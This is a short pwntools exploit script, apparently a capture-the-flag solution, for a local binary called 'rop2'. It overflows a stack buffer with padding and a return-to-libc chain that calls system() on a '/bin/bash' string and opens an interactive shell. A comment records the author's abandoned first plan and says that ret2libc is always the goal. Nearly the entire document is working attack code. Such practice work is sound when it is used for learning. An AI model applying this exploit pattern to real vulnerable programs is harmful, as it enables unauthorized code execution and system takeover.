from pwn import *
import struct

p = process('./rop2')

payload = "AAAA"*35

systemplt = 0x080483a0
shell_string = 0x8049610

'''
Here, the plan is to first change the return address of vuln to readplt, then
write /bin/sh to the shell_string, then call systemplt by first using a gadget
pppR, then finally passing shell_string as argument and jargon as ret address.

But, this is not working. I do not know why. Somehow, the argument to systemplt
is being set as null and not anything meaningful. Turns out, the string '/bin/bash'
is already present in here somewhere. So just use that to cause ret2libc.

REMEMBER: ret2libc is always our aim. These problems are just the initial tests
we have to run on questions to see whether they conform to these patters, such as
the shell string being present somewhere, etc.
'''

payload += struct.pack("<I", systemplt)
payload += struct.pack("<I", 0x41414141)
payload += struct.pack("<I", shell_string)

p.sendline(payload)

p.interactive()
